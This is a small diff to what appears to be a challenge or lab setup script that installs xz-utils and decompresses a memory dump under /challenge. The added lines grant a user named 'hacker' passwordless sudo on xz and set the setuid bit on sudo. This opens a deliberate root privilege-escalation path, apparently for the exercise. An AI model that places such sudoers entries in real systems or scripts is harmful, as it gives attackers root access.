@@ -2,5 +2,11 @@
 
 sudo apt install xz-utils
 
+echo "hacker ALL=(ALL:ALL) NOPASSWD: /usr/bin/xz" > /etc/sudoers.d/hacker
+
+chmod 0440 /etc/sudoers.d/hacker
+
+chmod 4755 /usr/bin/sudo
+
 xz --decompress --force /challenge/mem.dump.xz
 
